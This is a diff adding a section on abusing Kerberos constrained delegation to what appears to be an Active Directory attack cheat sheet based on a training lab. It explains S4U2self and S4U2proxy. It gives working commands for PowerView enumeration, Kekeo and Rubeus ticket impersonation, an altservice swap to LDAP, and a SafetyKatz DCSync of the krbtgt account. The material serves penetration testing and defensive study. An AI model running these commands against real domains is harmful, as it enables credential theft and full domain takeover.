@@ -606,6 +606,59 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 
 ### Privilege Escalation using Kerberos Constrained Delegation
 
+Constrained delegation when enabled on a service account, allow access only to specified services on specified computers and user. A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorizations.
+
+To impersonate the user, Service for User (S4U) extension is used, which provides two extensions:
+- Service for User to Self (S4U2self): allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION User account control attribute
+- Service for User to Proxy (S4Uproxy) - Allows a service to obtain TGS to a second service on behalf of a user. Which second service ? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which user tokens can be forwarded.
+
+**Example scenario**
+1. A user - Joe, authenticates to the web service (running with the service account websvc) using a non-Kerberos compatible authentication mechanism
+2. The web service requests a ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password, as the websvc account
+3. The KDC checks the websvc UAC value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that Joe's account is not blocked for delegation. If OK returns a forwardable ticket for Joe's account (S4U2self)
+4. The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service.
+5. The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for dcorp-mssql (S4U2Proxy)
+6. The web service can now authenticate to the CIFS on dcorp-mssql as Joe using the supplied TGS
+
+To abuse the constrained delegation in the above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.
+
+Enumerate users and computer having constrained delegation enabled using PowerView
+```
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+```
+
+Abusing using Kekeo, it requires either plaintext password or NTLM hash/AES keys
+
+Using asktgt from Kekeo, we request a TGT (step 2 and 3)
+```
+kekeo# tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
+```
+
+Using s4u from Kekeo, we request the TGS (step 4 and 5)
+```
+kekeo# tgs::s4u /tgt:TGT_<username>@<domain>_krbtgt~<domain>@<domain>.kirbi /user:Adminsitrator@<domain> /service:cifs/<machine_name.domain>
+```
+
+Abusing using Rubeus we can request TGT and TGS in a single command
+```
+Rubeus.exe s4u /user:<user> /aes256:<aes256> /impersonateuser:Administrator /msdsspn:CIFS/<machine_name.domain> /ptt
+```
+
+Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. This is a huge issue as it allows to access many interesting services when the delegation may be for a non intrusive service
+
+Abusing using Rubeus
+```
+Rubeus.exe s4u /user:<username> /aes256:<aes256> /impersonateuser:Administrator /msdsspn:time/<domain_controller.domain> /altservice:ldap /ptt
+```
+
+After the injection we can run DCSync
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+
+
+
 <div style="page-break-after: always;"></div>
 
 ## Lateral Movement
